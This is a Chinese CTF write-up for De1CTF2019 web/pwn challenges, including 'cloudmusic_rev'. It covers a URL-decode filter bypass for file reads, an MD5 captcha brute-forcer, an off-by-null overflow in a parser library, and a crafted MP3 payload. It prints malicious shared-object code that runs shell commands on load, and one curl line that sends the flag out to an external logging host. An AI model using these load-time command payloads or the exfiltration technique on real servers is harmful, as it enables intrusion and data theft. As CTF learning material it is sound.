我当时问了下其他师傅具体怎么算的，这个是gcc优化导致的,我们可以自己写一段代码来调试就知道了。
所以那句话其实就是`eax%256` 256=>0x100
这个程序的源代码是这样的,gcc优化后的确挺难理解的，后面我会针对这个问题，研究下。
这样你想想会导致什么问题。
我先看下.bss段中变量存放的地址
>
> _BSS段_通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前_BSS段_会自动清0。，但是地址偏移是不变。
然后 `0x93c0 - 0x92c0= 0x100` ,`password`长度
    #include 
    #include 
    char _version[0x500];
    char * version = &_version;
    __attribute((constructor)) void fun(){
      memset(version, 0 ,0x500);
      FILE * fp = popen("find / -user root -perm -4000", "r");
      if (fp==NULL) return;
      fread(version, 1 , 0x500,fp);
      pclose(fp);
    }
我们也可以直接执行system然后写入目录里面。
    #include 
    #include 
    #include 
    char _version[0x130];
    char * version = &_version;
    __attribute((constructor)) void fun(){
      memset(version, 0 ,0x130);ls
      strcpy(version, "v2.0");
      system("find / -user root -perm -4000 > /var/www/html/uploads/firmware/res.txt");
    }
gcc编译命令share object:
`gcc -shared -fPIC -o web1.so web1.c`
然后我们上传这个文件就行了。
这里需要注意下本地的php版本要大于7因为，php7修复了随机数生成的一些缺陷，导致与php7一下生成的值不一样。
    // exp.php
    #include 
    #include 
    char _version[0x500];
    char * version = &_version;
    __attribute((constructor)) void fun(){
      memset(version, 0 ,0x500);
      FILE * fp = popen("/usr/bin/tac /flag", "r");
      if (fp==NULL) return;
      fread(version, 1 , 0x500,fp);
      pclose(fp);
    }
### 0x3.2 cloudmusic_rev - 滑稽云音乐2.0
代码主体还是国赛的题目源码，所以我们做这道题目可以白盒+黑盒来做。
首先先黑盒搞出那个文件读取，后面就是白盒操作了。
#### 0x3.2.1 文件读取
这个考点的确是有依据的，因为`$_SERVER['QUERY_STRING']`不会对字符串解码，但是浏览器会自动编码，所以通常写代码的时候就会`urldecode`,如果写错了过滤与解码的顺序，就会导致出现漏洞。
所以说我们把上面那个payloas urlencode一下再base64一下就能获取代码了。
#### 0x3.2.2 off by null
参照国赛的题目，我们读取3个文件的代码就行了，关于验证码很简单这里就不叙述了。
直接上脚本
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    import random
    from hashlib import md5
    def get_plain(cipher, code, end = 5, length = 8):
        characters = '''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|''' 
        characters_ = list(characters)
        while True:
            plain = str(''.join(random.sample(characters_, length)))
            if md5(plain+code).hexdigest()[:end] == cipher:
                break
        return plain
    print(get_plain('852619', '3ECBACGv', 6))
然后我们读下 `upload.php` `firmware.php` `parser.so`
你会发现`data`写在了`size`的上面了，然后限制了大小修改为了`0x70`
然后`firmware.php`去掉了回显，但是我们可以通过写入uploa文件夹，脚本如下
    #include 
    #include 
    char _version[0x130];
    char * version = &_version;
    __attribute__ ((constructor)) void fun(){
        memset(version,0,0x130);
        FILE * fp=popen("/usr/bin/tac /flag > /var/www/html/uploads/firmware/wulasite.txt", "r");
        if (fp==NULL) return;
        fread(version, 1, 0x100, fp);
        pclose(fp);
    }
外带数据的话,so文件代码如下:
    #include 
    #include 
    #include  
    char _version[0x130];
    char *version = &_version;
    __attribute ((constructor)) void shell(){
        strcpy(version, "cloudmusic_rev");
      // excute command
      const char *command =  "curl  -v --data-urlencode flag=`/usr/bin/tac /flag` 3bqxxx.ceye.io";
       system(command);
    }
下面让我们重点分析那个pwn点吧，打开ida进行分析
我们可以看到相对国赛的改动
限制了内容长度最大是`0x70`
这里用strlen来判断是存在问题的，因为`strlen`是不会把`\0` 去计算进去的。那么是怎么实现攻击 off by null攻击的呢。
其实就是修改了`mem_mframe_data`的地址为 存放密码的`mem_passwd`
这里为什么用国赛的思路不行呢，这里我简单说说
> 1.首先是限制了0x70
>
>   1.
>
>
> 
    def upload_music():
        music = preset_music[:0x6] + '\x00\x00\x03\x00' + preset_music[0x0a:0x53]
        music += '\x00\x00\x03\x00' + '\x00\x00\x03' + 'a' * 0x70 + '\x00'
        with open('web2.mp3', 'wb') as f:
            f.write(music)
当我们上传这个内容是0x70长度的mp3上去时
首先`mem_mframe_data`数组大小是`0x70`
这里发生了溢出，溢出了`\0`,strcpy本来返回的是 `mem_mframe_data`地址值，但是由于溢出了，直接修改了ebp的低位，从而
这样就实现了修改地址，从而string函数读取的时候就跑去读密码的地址了。
不懂可以看下这个文章: [ Linux (x86) Exploit 开发系列教程之三(Off-By-One 漏洞
(基于栈))](https://www.cnblogs.com/momoli/p/10865324.html)
## 0x4 感激
很感谢三叶草的@0xC4m3l师傅，还有@impakho、@湖大QQ星师傅耐心解答我的问题，让我学习到了很多大师傅们的姿势，一想到从最开始高三暑假三叶草@流星师傅带我入门ctf，到现在都过去了2年了，现在自己的水平打比赛还是很吃力，吹爆三叶草的各位师傅，希望自己能加把劲跟上师傅们的步伐，不辜负流星师傅一直以来对我的耐心指导。
## 0x5 总结
这两个题目很有意思的，让人感觉pwn与web结合起来是多么美妙的事情，同时我感觉到了pwn真的是很有意思的东西，就是感觉有种geek的感觉，这是让我感觉跟web差别很大，很有意思的东西。还有就是自己需要多写汇编，重新巩固c语言基础，然后ida反编译去学习gcc优化代码与源代码的差异。最后小小吐槽下这个题目，这个题目考点不是很难，难的是比较新颖，如何构造一个满足的mp3文件，在国赛那种断网环境，真的不容易。
## 0x6 参考链接
[De1CTF2019 官方Writeup(Web/Misc) -- De1ta ](https://xz.aliyun.com/t/5945)
[MP3文件结构解析](https://blog.csdn.net/u010650845/article/details/53520426)
[ELF是什么？](https://www.jianshu.com/p/7eb03c7230fd)
[IDA Pro: def.h](https://blog.csdn.net/rzwinters/article/details/79267376)
[IDA-数据显示窗口（反汇编窗口、函数窗口、十六进制窗口）](https://blog.csdn.net/tabactivity/article/details/78492371)
[64位和32位的寄存器和汇编的比较](https://blog.csdn.net/qq_29343201/article/details/51278798)
[X64的函数调用规则](http://blog.sina.com.cn/s/blog_6f6769b50100uhzz.html)
[**attribute** 机制使用](https://www.jianshu.com/p/e2dfccc32c80)